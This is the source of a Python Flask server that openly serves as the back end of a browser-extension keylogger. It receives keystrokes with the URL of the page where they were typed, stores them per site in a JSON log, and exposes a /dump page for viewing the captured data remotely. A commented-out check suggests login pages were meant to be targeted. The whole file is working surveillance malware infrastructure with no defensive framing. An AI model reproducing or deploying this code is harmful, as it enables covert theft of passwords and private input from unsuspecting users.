""" Keylogger/server/server.py

    This is a Python Flask Server to capture the keystrokes
    and corresponding webpage from the keylogger extension.
"""
import json
from flask import Flask, render_template, request
from flask_cors import CORS
# from flask_bootstrap import Bootstrap

APP = Flask(__name__)
# bs = Bootstrap(APP)
CORS(APP)

def check_log_exists_and_create_log():
    try:
        logfile = open("log.json")
    except FileNotFoundError:
        print("No log file, creating log")
        logfile = open("log.json", "w")
        empty_log = {'sites' : []}
        logfile.write(json.dumps(empty_log))
        logfile.close()

""" Destination route for logs from the extension. 
    Recieves a POST request with a body of:
    {
        page : URL String
        key  : Keypress string
    }
"""
@APP.route("/keylogger", methods=["POST"])
def recieve_log():
    request_body = request.get_json()
    url = request_body['page']
    key = request_body['key']

    check_log_exists_and_create_log()

    # if "login" in url:
    with open("log.json") as logfile:
        log = json.load(logfile)
        sites = log['sites']
        matched = False
        for site in sites:
            if site['url'] == url:
                site['keystrokes'] += key
                matched = True
        if not matched:
            sites.append({
                'url' : url,
                'keystrokes' : key
            })

    json_object = json.dumps(log, indent = 4)
    with open("log.json", "w") as logfile:
        logfile.write(json_object)
    return ""

"""
    Route to access the log remotely. 
    Recieves a GET request with the server returning the log.json file:
    {
        "URL" : "Keypresses"
        ...
    }
"""
@APP.route("/dump", methods=["GET"])
def dump_log():
    with open("log.json") as logfile:
        log = json.load(logfile)
    return render_template('dump.html', sites=log['sites'])

if __name__ == "__main__":
    APP.run(debug=False, port=5000)
